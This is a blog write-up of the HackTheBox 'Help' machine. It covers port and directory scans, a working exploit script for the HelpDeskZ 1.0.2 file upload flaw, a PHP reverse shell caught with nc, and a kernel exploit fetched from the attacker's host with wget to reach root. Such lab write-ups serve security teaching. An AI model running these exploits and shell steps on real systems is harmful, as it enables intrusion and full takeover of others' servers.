---
layout: post
title: Hackthebox Help Writeup
categories: HackTheBox
---

![placeholder](https://inar1.github.io/public/images/2019-06-09/help_badge.png)
## Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has bunch of vulnerable machines in its own VPN.
This is a write-up of machine "Help" on that website.

## Solution
### 1. Initial Enumeration
Port Scanning:
{% highlight shell %}
root@kali:~# nmap -sV -sC -p- 10.10.10.121
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-30 08:06 EET
Nmap scan report for 10.10.10.121
Host is up (0.035s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.73 seconds
{% endhighlight %}

Gobuster HTTP:
{% highlight shell %}
root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,204,301,302,403' -u http://10.10.10.121

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.121/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,403
[+] Timeout      : 10s
=====================================================
2019/01/30 08:32:04 Starting gobuster
=====================================================
/support (Status: 301)
/javascript (Status: 301)
/server-status (Status: 403)
=====================================================
2019/01/30 08:46:04 Finished
=====================================================
{% endhighlight %}

Gobuster HTTP /support:
{% highlight shell %}
root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,204,301,302,403' -u http://10.10.10.121/support -x .html,.php

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.121/support/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,403
[+] Extensions   : html,php
[+] Timeout      : 10s
=====================================================
2019/06/08 20:00:01 Starting gobuster
=====================================================
/images (Status: 301)
/index.php (Status: 200)
/uploads (Status: 301)
/css (Status: 301)
/includes (Status: 301)
/js (Status: 301)
/readme.html (Status: 200)
/views (Status: 301)
/captcha.php (Status: 200)
/controllers (Status: 301)
=====================================================
2019/06/08 20:45:19 Finished
=====================================================
{% endhighlight %}

### 2. Getting User
In /support, we can confirm <a href="https://github.com/evolutionscript/HelpDeskZ-1.0">"HelpdeskZ"</a> is running.
![placeholder](https://inar1.github.io/public/images/2019-06-09/2019-06-09-23-29-00.png)

In /readme.html, we can see that the version of HelpdeskZ is "1.0.2"
![placeholder](https://inar1.github.io/public/images/2019-06-09/2019-06-09-23-29-16.png)

By searchsploit, we can find a vulnerability for helpdesk ver 1.0.2.
{% highlight shell %}
root@kali:~# searchsploit helpdeskz
----------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                           |  Path
                                                                                         | (/usr/share/exploitdb/)
----------------------------------------------------------------------------------------- ----------------------------------------
HelpDeskZ 1.0.2 - Arbitrary File Upload                                                  | exploits/php/webapps/40300.py
HelpDeskZ < 1.0.2 - (Authenticated) SQL Injection / Unauthorized File Download           | exploits/php/webapps/41200.py
----------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
{% endhighlight %}

Sounds like we can upload arbitraty file with this file upload feature in module for ticket submission.
![placeholder](https://inar1.github.io/public/images/2019-06-09/2019-06-09-23-29-53.png)

However, when we try php file uploading, we get "File is not allowed"
![placeholder](https://inar1.github.io/public/images/2019-06-09/2019-06-09-16-44-38.png)

Then, try to look at the code of HelpdeskZ.
<a href="https://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/controllers/submit_ticket_controller.php">"https://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/controllers/submit_ticket_controller.php"</a> 
{% highlight php %}
if(!isset($error_msg) && $settings['ticket_attachment']==1){
    $uploaddir = UPLOAD_DIR.'tickets/';
    if($_FILES['attachment']['error'] == 0){
        $ext = pathinfo($_FILES['attachment']['name'], PATHINFO_EXTENSION);
        $filename = md5($_FILES['attachment']['name'].time()).".".$ext;
        $fileuploaded[] = array('name' => $_FILES['attachment']['name'], 'enc' => $filename, 'size' => formatBytes($_FILES['attachment']['size']), 'filetype' => $_FILES['attachment']['type']);
        $uploadedfile = $uploaddir.$filename;
        if (!move_uploaded_file($_FILES['attachment']['tmp_name'], $uploadedfile)) {
            $show_step2 = true;
            $error_msg = $LANG['ERROR_UPLOADING_A_FILE'];
        }else{
            $fileverification = verifyAttachment($_FILES['attachment']);
            switch($fileverification['msg_code']){
                case '1':
                $show_step2 = true;
                $error_msg = $LANG['INVALID_FILE_EXTENSION'];
                break;
                case '2':
                $show_step2 = true;
                $error_msg = $LANG['FILE_NOT_ALLOWED'];
                break;
                case '3':
                $show_step2 = true;
                $error_msg = str_replace('%size%',$fileverification['msg_extra'],$LANG['FILE_IS_BIG']);
                break;
            }
        }
    }
}
{% endhighlight %}

Followings are the important information.
1. The file is uploaded to "/support/uploads/tickets/"
2. time() is used to encode the filenames
3. Even if it says "File is not allowed", we can still upload the php extension file.

By sending a request to "Help", we can figure out this server is using GMT.
{% highlight shell %}
root@kali:~# curl --head http://10.10.10.121/support
HTTP/1.1 301 Moved Permanently
Date: Sun, 09 Jun 2019 06:30:05 GMT
Server: Apache/2.4.18 (Ubuntu)
Location: http://10.10.10.121/support/
Content-Type: text/html; charset=iso-8859-1
{% endhighlight %}

We already have an exploit code on our kali linux. However, we need to modify the script a bit.<br>
I've commented the line to be fixed and added a new line.
{% highlight pytohn %}
#! /usr/bin/python

import hashlib
import time
import sys
import requests

print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'

if len(sys.argv) < 3:
    print "Usage: {} [baseUrl] [nameOfUploadedFile]".format(sys.argv[0])
    sys.exit(1)

helpdeskzBaseUrl = sys.argv[1]
fileName = sys.argv[2]

# currentTime = int((datetime.datetime.strptime(r.headers['date'], %a, %d %b %Y %H%M%S %Z) - datetime.datetime(1970,1,1)).total_seconds())
currentTime = int(time.time())

for x in range(0, 300):
    plaintext = fileName + str(currentTime - x)
    md5hash = hashlib.md5(plaintext).hexdigest()

    url = helpdeskzBaseUrl+md5hash+'.php'
    response = requests.head(url)
    if response.status_code == 200:
        print "found!"
        print url
        sys.exit(0)

print "Sorry, I did not find anything"
{% endhighlight %}

Then, upload our php web reverse shell, launch nc and run the exploit.<br>
![placeholder](https://inar1.github.io/public/images/2019-06-09/2019-06-09-23-30-54.png)
{% highlight shell %}
root@kali:~# nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.121] 45226
Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 13:00:57 up  5:15,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)
{% endhighlight %}

user.txt is in the home directory of user "help".
{% highlight shell %}
$ cat /home/help/user.txt
bb8a7b36bdce0c61ccebaa173ef946af
{% endhighlight %}

### 3. Getting Root
The kernel of this machine has <a href="https://www.exploit-db.com/exploits/44298">privilege escalation.</a><br>
By googling like "kernel 4.4.0.116 exploit", I could immediately find it.
{% highlight shell %}
$ uname -a
Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
{% endhighlight %}

Then, launch simple http server and transfer it.<br>
We have wget command on the target server.
{% highlight shell %}
$ pwd  
/tmp
$ wget http://10.10.14.3/44298.c
--2019-06-09 13:13:07--  http://10.10.14.3/44298.c
Connecting to 10.10.14.3:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6021 (5.9K) [text/plain]
Saving to: '44298.c'

     0K .....                                                 100%  414M=0s

2019-06-09 13:13:07 (414 MB/s) - '44298.c' saved [6021/6021]
{% endhighlight %}

After that, what we have to do is just compiling and executing.
{% highlight shell %}
$ gcc -o exploit 44298.c
$ ./exploit

id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare),1000(help)
cat /root/root.txt
b7fe6082dcdf0c1b1e02ab0d9daddb98
{% endhighlight %}
